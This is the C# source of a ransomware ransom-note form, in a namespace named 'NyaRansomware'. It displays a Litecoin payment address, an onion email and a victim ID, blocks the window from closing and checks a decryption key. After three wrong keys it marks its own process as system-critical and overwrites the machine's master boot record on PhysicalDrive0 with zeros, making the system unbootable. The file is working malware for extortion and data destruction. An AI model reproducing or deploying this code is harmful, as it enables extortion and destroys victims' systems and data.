using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NyaRansomware
{
    public partial class Form1 : Form
    {

        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
           string lpFileName,
           uint dwDesiredAccess,
           uint dwShareMode,
           IntPtr lpSecurityAttributes,
           uint dwCreationDisposition,
           uint dwFlagsAndAttributes,
           IntPtr hTemplateFile);


        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        private const uint OpenExisting = 0x3;


        private const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);



        public static int Tries = 3;
        public Form1()
        {
            InitializeComponent();
            TopMost = true;

        }

        private void button2_Click(object sender, EventArgs e)
        {
           
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
          
            LTC.Text = Config.Config.LTCAddress;
            Email.Text = Config.Config.OnionEmail;
            ID.Text = Program.ID;
            timer2.Start();
        }
      

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void button3_Click(object sender, EventArgs e)
        {
          
            if(KEy.Text == Program.Key)
            {
                Encryption_Start.Encrypt.OFF_Encrypt();
            }
            else
            {
                Tries--;
                MessageBox.Show($"Wrong Key! Tries Remaining:{Tries}", "Wrong!",MessageBoxButtons.OK,MessageBoxIcon.Error);
            }
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://onionmail.org");
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            timer2.Stop();
            if(Tries == 0)
            {
                timer1.Stop();
                int isCritical = 1;
                int BreakOnTermination = 0x1D;
                Process.EnterDebugMode();

                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                var mbrData = new byte[MbrSize];

                var mbr = CreateFile(
                "\\\\.\\PhysicalDrive0",
                GenericAll,
                FileShareRead | FileShareWrite,
                IntPtr.Zero,
                OpenExisting,
                0,
                IntPtr.Zero);

                WriteFile(mbr,
                mbrData,
                MbrSize,
                out uint lpNumberOfBytesWritten,
                IntPtr.Zero);
                Environment.Exit(0);
            }
            timer2.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(Email.Text);
        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            Clipboard.SetText(ID.Text);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(LTC.Text);
        }
    }
}
